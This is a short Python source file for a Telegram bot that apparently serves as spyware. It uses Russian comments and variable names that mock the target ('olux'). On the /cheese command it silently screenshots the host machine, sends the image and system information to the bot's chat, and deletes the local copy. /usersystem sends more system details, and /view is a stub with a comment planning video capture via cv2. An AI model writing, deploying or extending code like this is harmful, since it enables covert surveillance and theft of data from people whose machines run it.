import os
import types
import pyautogui
from aiogram import Bot, Dispatcher, types
from aiogram.filters.command import Command
from aiogram.types import FSInputFile
from getusersystem import get_system_info

LOCALAPDATA_PATH = os.getenv('LOCALAPPDATA')    # no usage yet
SCREEN_PATH = 'screenshot_from_olux.png'
token = os.getenv('API_TOKEN')

async def main() -> None:
    """Основная функция для работы с тг ботом"""
    bot = Bot(token='-')
    dp = Dispatcher()

    @dp.message(Command('cheese'))
    async def createScreenshot(message: types.Message):
        screen_oluxa = pyautogui.screenshot()
        screen_oluxa.save(SCREEN_PATH)
        output_photo = FSInputFile(SCREEN_PATH)

        await message.answer_photo(photo=output_photo)
        await message.answer(str(get_system_info()))
        os.remove(SCREEN_PATH)

    @dp.message(Command('view'))
    async def recording(message: types.Message):
        """будет позже через cv2 мб будет отдельный файл"""

        await message.answer(f'функция /{message} пока что не работает')

    @dp.message(Command('usersystem'))
    async def getfullsysteminfo(message: types.Message):
        await message.answer(str(get_system_info(False)))

    await dp.start_polling(bot)

